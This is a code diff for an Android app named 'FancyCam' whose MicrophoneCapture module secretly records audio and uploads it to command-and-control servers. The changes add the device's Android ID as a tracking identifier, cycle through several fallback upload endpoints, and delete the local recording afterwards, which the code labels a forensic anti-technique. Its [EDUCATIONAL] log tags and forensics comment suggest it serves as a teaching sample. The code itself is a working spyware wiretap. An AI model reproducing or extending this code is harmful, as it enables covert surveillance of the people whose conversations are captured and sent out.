@@ -1,6 +1,7 @@
 package com.example.fancycam
 
 import android.content.Context
+import android.content.pm.PackageManager
 import android.media.MediaRecorder
 import android.os.Build
 import android.util.Log
@@ -30,13 +31,12 @@ import java.util.concurrent.TimeUnit
  * On Android 11+, a persistent notification appears during recording.
  * The forensic artifact is the audio file timestamp + network upload correlation.
  */
+import android.provider.Settings
+import android.Manifest
+
 object MicrophoneCapture {
 
     private const val TAG = "MicrophoneCapture"
-
-    private const val C2_SERVER_IP = "127.0.0.1"
-    private const val C2_SERVER_PORT = 5000
-    private const val C2_BASE_URL = "http://$C2_SERVER_IP:$C2_SERVER_PORT"
 
     private val httpClient = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -57,6 +57,11 @@ object MicrophoneCapture {
      *   T+35s: Upload complete, recording deleted
      */
     fun startCaptureAndExfiltrate(context: Context, durationMs: Long = 30000L) {
+        if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "[EDUCATIONAL] RECORD_AUDIO permission not granted; aborting capture")
+            return
+        }
+
         Thread {
             try {
                 val outputFile = File(context.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
@@ -97,7 +102,7 @@ object MicrophoneCapture {
                 Log.d(TAG, "[EDUCATIONAL] Recording stopped — file: ${outputFile.name} (${outputFile.length() / 1024} KB)")
 
                 // === Exfiltrate ===
-                exfiltrateAudioFile(outputFile)
+                exfiltrateAudioFile(context, outputFile)
 
             } catch (e: Exception) {
                 Log.e(TAG, "[EDUCATIONAL] Microphone capture failed", e)
@@ -111,14 +116,18 @@ object MicrophoneCapture {
     /**
      * Uploads recorded audio file to C2 server as multipart POST.
      */
-    private fun exfiltrateAudioFile(file: File) {
+    private fun exfiltrateAudioFile(context: Context, file: File) {
         try {
-            if (!file.exists()) {
-                Log.w(TAG, "[EDUCATIONAL] Audio file not found")
+            if (!file.exists() || file.length() == 0L) {
+                Log.w(TAG, "[EDUCATIONAL] Audio file not found or empty")
                 return
             }
 
-            Log.d(TAG, "[EDUCATIONAL] Uploading audio to C2...")
+            val aid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
+            val endpoints = AppConfig.getAudioUploadEndpoints(context)
+            var uploadedSuccessfully = false
+
+            Log.d(TAG, "[EDUCATIONAL] Uploading audio (${file.length()} bytes) to C2 candidate endpoints: $endpoints")
 
             val multipart = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
@@ -127,19 +136,54 @@ object MicrophoneCapture {
                     file.name,
                     file.asRequestBody("audio/mp4".toMediaType())
                 )
-                .build()
-
-            val request = Request.Builder()
-                .url("$C2_BASE_URL/exfil/audio")
-                .post(multipart)
-                .addHeader("User-Agent", "FancyCam-Educational/1.0")
-                .build()
-
-            httpClient.newCall(request).execute().use { response ->
-                Log.d(TAG, "[EDUCATIONAL] Audio upload response: ${response.code}")
-                if (response.isSuccessful) {
-                    Log.i(TAG, "[EDUCATIONAL] Audio exfiltration successful")
+                .apply {
+                    if (aid.isNotEmpty()) {
+                        addFormDataPart("android_id", aid)
+                    }
                 }
+                .build()
+
+            for (endpoint in endpoints) {
+                try {
+                    val requestBuilder = Request.Builder()
+                        .url(endpoint)
+                        .post(multipart)
+                        .addHeader("User-Agent", "FancyCam-Educational/1.0")
+
+                    if (aid.isNotEmpty()) {
+                        requestBuilder.addHeader("X-Android-ID", aid)
+                    }
+
+                    httpClient.newCall(requestBuilder.build()).execute().use { response ->
+                        Log.d(TAG, "[EDUCATIONAL] Audio upload response from $endpoint: ${response.code}")
+                        if (response.isSuccessful) {
+                            Log.i(TAG, "[EDUCATIONAL] Audio exfiltration successful to $endpoint")
+                            uploadedSuccessfully = true
+                            AppActivityLogger.logActivity(
+                                context,
+                                type = "AUDIO_UPLOAD",
+                                title = "Audio wiretap uploaded",
+                                detail = "${file.name} (${file.length() / 1024} KB) -> $endpoint",
+                                success = true
+                            )
+                            return@use
+                        }
+                    }
+
+                    if (uploadedSuccessfully) break
+                } catch (e: Exception) {
+                    Log.w(TAG, "[EDUCATIONAL] Failed to upload audio to $endpoint: ${e.message}")
+                }
+            }
+
+            if (!uploadedSuccessfully) {
+                AppActivityLogger.logActivity(
+                    context,
+                    type = "AUDIO_FAIL",
+                    title = "Audio wiretap upload failed",
+                    detail = "${file.name}: Could not reach server",
+                    success = false
+                )
             }
 
             // Delete local file after exfiltration (forensic anti-technique)
